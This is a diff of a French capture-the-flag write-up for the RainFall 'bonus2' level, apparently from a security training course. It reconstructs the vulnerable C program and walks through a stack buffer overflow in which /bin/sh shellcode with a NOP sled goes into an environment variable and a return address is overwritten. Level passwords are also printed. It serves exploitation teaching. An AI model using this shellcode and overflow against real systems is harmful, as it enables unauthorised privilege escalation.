@@ -2,15 +2,16 @@
 
 pass : `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
 
-## Sources :
+## Source :
 ```c
 #include <string.h>
 #include <stdlib.h>
 
-int language = 0;
+int language = 0;  // 0x08049988
 
-int		greetuser(char *name) {
+int		greetuser(char *name) {  // 0x08048484
 	char str[72];  // ebp-0x48 == esp+0x10
+
 	switch (language) {
 		case 0:
 			strcpy(str, "Hello ");
@@ -28,8 +29,9 @@ int		greetuser(char *name) {
 	return (puts(str));
 }
 
-int		main(int ac, char **av) {
+int		main(int ac, char **av) {  // 0x08048529
 	char str[76];  // esp+0x50
+	char str2[80];  // esp
 	char *lang;  // esp+0x9c
 
 	if (ac != 3)
@@ -49,13 +51,17 @@ int		main(int ac, char **av) {
 			}
 		}
 	}
-	return greetuser(str);
+	for (int i = 0; i < 19; i++) {
+		str2[i] = str[i];
+	}
+
+	return greetuser(str2);
 }
 ```
 
 ## Recherche :
 
-On remarque que si on a lang == "fi" ou "nl", alors dans `greetuser`, la première partie de `str` sera plus longue et on va segfault.
+On remarque que si on a `lang == "fi"` ou `"nl"`, alors dans `greetuser`, la première partie de `str` sera plus longue et on va segfault.
 
 Faisons alors `export LANG="fi"`
 
@@ -66,10 +72,11 @@ On va maintenant procéder comme pour le `bonus0` en mettant un shellcode dans u
 
 On va fait mettre notre shell code dans un `env` `EXPLOIT` :
 ```
-export EXPLOIT="`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"`
+export EXPLOIT="`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"`
 ```
 Dans `/tmp`, on va créer un programme pour récupérer l'addresse :
-bonus2@RainFall:/tmp$ cat getenv.c
+`bonus2@RainFall:/tmp$ cat getenv.c`
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -87,23 +94,12 @@ bonus2@RainFall:/tmp$ ./bonus2 EXPLOIT
 EXPLOIT is 0xbffff918
 ```
 
+On peut le retrouver également avec gdb avec la commande `x/1s *((char **)environ)` ou `x/s *environ`
+
 En retournant dans le `~`, on va pouvoir executer notre programme en appelant notre shellcode :
+
 ```sh
-bonus2@RainFall:~$ ./bonus2 $(perl -e 'print "A"x40') $(perl -e 'print "B"x18 . "\x18\xf9\xff\xbf"')
-perl: warning: Setting locale failed.
-perl: warning: Please check that your locale settings:
-        LANGUAGE = (unset),
-        LC_ALL = (unset),
-        LANG = "fi"
-    are supported and installed on your system.
-perl: warning: Falling back to the standard locale ("C").
-perl: warning: Setting locale failed.
-perl: warning: Please check that your locale settings:
-        LANGUAGE = (unset),
-        LC_ALL = (unset),
-        LANG = "fi"
-    are supported and installed on your system.
-perl: warning: Falling back to the standard locale ("C").
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x18\xf9\xff\xbf"')
 Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB▒���
 $ whoami
 bonus3
@@ -114,41 +110,26 @@ On est bon !
 ## Exploit :
 
 ```shell
-export LANG="fi"; export EXPLOIT="$(perl -e 'print "\x90"x50 . ""')
-
 bonus2@RainFall:~$ export LANG="fi"
-bonus2@RainFall:~$ export EXPLOIT="`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"
-perl: warning: Setting locale failed.
-perl: warning: Please check that your locale settings:
-        LANGUAGE = (unset),
-        LC_ALL = (unset),
-        LANG = "fi"
-    are supported and installed on your system.
-perl: warning: Falling back to the standard locale ("C").
-bonus2@RainFall:~$ cd /tmp/
-bonus2@RainFall:/tmp$ ./bonus2 EXPLOIT
-EXPLOIT is 0xbffff918
-bonus2@RainFall:/tmp$ cd -
-/home/user/bonus2
-bonus2@RainFall:~$ ./bonus2 $(perl -e 'print "A"x40') $(perl -e 'print "B"x18 . "\x18\xf9\xff\xbf"')
-perl: warning: Setting locale failed.
-perl: warning: Please check that your locale settings:
-        LANGUAGE = (unset),
-        LC_ALL = (unset),
-        LANG = "fi"
-    are supported and installed on your system.
-perl: warning: Falling back to the standard locale ("C").
-perl: warning: Setting locale failed.
-perl: warning: Please check that your locale settings:
-        LANGUAGE = (unset),
-        LC_ALL = (unset),
-        LANG = "fi"
-    are supported and installed on your system.
-perl: warning: Falling back to the standard locale ("C").
-Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB▒���
+bonus2@RainFall:~$ export EXPLOIT="`python -c 'print "\x90"*4096+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"
+bonus2@RainFall:~$ gdb ./bonus2
+(gdb) b main
+Breakpoint 1 at 0x804852f
+(gdb) r
+Starting program: /home/user/bonus2/bonus2
+
+Breakpoint 1, 0x0804852f in main ()
+(gdb) x/1s *environ
+0xbfffe8f4:      "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+(gdb) p/x 0xbfffe8f4+512
+$1 = 0xbfffeaf4
+(gdb) q
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xf4\xea\xff\xbf"')Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
 $ whoami
 bonus3
 $ cd ../bonus3
 $ cat .pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 ```
+
+> Dans l'exploit, on rajoute un offset au shellcode pour être sûr de ne pas avoir de mauvaise surprise par rapport à un éventuel décalage de la mémoire.
